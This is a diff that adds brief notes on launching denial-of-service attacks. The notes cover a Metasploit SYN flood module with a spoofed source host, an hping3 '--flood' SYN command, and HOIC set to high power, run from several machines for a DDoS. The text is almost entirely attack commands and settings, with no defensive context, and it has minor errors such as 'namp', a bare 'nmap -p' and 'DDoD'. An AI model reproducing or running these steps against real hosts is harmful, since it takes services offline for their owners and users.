@@ -1,0 +1,24 @@
+* SYN Flood using metasploit:
+  - First scan the target machine with "namp" to check which ports are open:
+        nmap -p <target_ip>
+  - Run msfconsole
+  - Run below commands in msfconsole:
+        # use auxiliary/dos/tcp/synflood
+        # show options
+            set RHOST
+            set RPORT
+            set SHOST (spoofable source host)
+            set TIMEOUT (eg 20000)
+
+* Send huge amounts of SYN packets via hping3
+    - Run below command to start the attack:
+        # hping3 -S <target_IP> -a <attacker's_ip> -p <port> --flood
+
+* Performing DDoS using HOIC(high Orbit on Cannon) Tool:
+    - Open the HOIC GUI
+    - After the GUI appears click on "+" below targets.
+    - Type the target url
+    - Set power to high
+    - Select "GenericBoost.hoic" from drop-down list
+    - Set the "Threads" value to 20.
+    Peform the above steps from different machine to create a DDoD scenario
